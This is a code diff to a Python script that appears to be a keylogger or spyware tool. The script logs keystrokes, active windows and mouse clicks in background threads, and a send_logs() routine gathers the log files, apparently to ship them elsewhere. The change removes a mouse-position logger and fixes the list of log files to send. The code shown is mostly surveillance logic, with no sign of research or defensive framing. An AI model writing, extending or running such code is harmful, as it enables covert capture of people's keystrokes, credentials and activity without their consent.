@@ -39,16 +39,6 @@ except Exception as e:
     print(f"[!] Mouse click tracking disabled: {e}")
     MOUSE_CLICK_OK = False
 
-# mouse setup
-try:
-    import pyautogui
-
-    pyautogui.FAILSAFE = False
-    MOUSE_OK = True
-except Exception as e:
-    print(f"[!] Mouse disabled: {e}")
-    MOUSE_OK = False
-
 # window setup
 try:
     import pywinctl as pwc
@@ -108,18 +98,6 @@ def start_mouse_clicks():
         listener.join()
 
 
-# mouse code
-def start_mouse():
-    if not MOUSE_OK:
-        return
-    with open("mouse_log.txt", "a") as f:
-        while True:
-            x, y = pyautogui.position()
-            f.write(f"{time.time():.2f},{x},{y}\n")
-            f.flush()
-            time.sleep(0.1)
-
-
 # window code
 def start_window():
     if not WINDOW_OK:
@@ -149,8 +127,8 @@ def send_logs():
 
     for filename in [
         "key_logs.txt",
-        "mouse_log.txt",
-        "window_log.txt, mouse_clicks.txt",
+        "window_log.txt",
+        "mouse_clicks.txt",
     ]:
         if os.path.exists(filename):
             with open(filename, "r", errors="ignore") as f:
@@ -188,8 +166,6 @@ if __name__ == "__main__":
 
     if KEYBOARD_OK:
         threads.append(threading.Thread(target=start_keyboard, daemon=True))
-    if MOUSE_OK:
-        threads.append(threading.Thread(target=start_mouse, daemon=True))
     if WINDOW_OK:
         threads.append(threading.Thread(target=start_window, daemon=True))
     if MOUSE_CLICK_OK:
